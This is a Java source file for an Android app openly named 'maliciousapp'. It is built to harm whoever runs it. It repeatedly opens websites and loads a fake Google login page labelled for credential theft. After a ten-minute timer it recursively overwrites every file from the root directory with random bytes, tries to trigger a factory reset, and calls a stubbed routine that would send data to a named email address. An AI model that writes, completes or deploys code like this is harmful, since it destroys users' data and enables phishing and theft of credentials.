package com.example.maliciousapp;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Random;

public class MainActivity extends Activity {
    private CountDownTimer timer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Open websites every minute
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(60000);
                    openWebsites();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        // Start 10-minute timer
        timer = new CountDownTimer(600000, 1000) {
            public void onTick(long millisUntilFinished) {
                // Display timer (optional)
            }
            public void onFinish() {
                corruptFiles();
                factoryReset();
                sendData();
            }
        }.start();

        // Show fake login screens
        showLoginScreens();
    }

    private void openWebsites() {
        String[] sites = {"http://example.com", "http://test.com"};
        for (String site : sites) {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(site));
            startActivity(intent);
        }
    }

    private void showLoginScreens() {
        // Placeholder for Google and PayPal login screens
        // Use WebView to load fake login pages
        WebView webView = new WebView(this);
        webView.loadUrl("http://fake-login-page.com/google");
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                // Steal credentials (not implemented)
            }
        });
    }

    private void corruptFiles() {
        File root = new File("/");
        corruptRecursive(root);
    }

    private void corruptRecursive(File file) {
        if (file.isDirectory()) {
            for (File f : file.listFiles()) {
                corruptRecursive(f);
            }
        } else {
            try {
                FileOutputStream fos = new FileOutputStream(file);
                byte[] randomData = new byte[1024];
                new Random().nextBytes(randomData);
                fos.write(randomData);
                fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void factoryReset() {
        // This requires system permissions and won't work on normal apps
        Intent intent = new Intent(Intent.ACTION_MASTER_CLEAR);
        sendBroadcast(intent);
    }

    private void sendData() {
        // Placeholder for sending data to email
        // This requires backend server setup
        String email = "noarich118@gmail.com";
        // Not implemented
    }
}
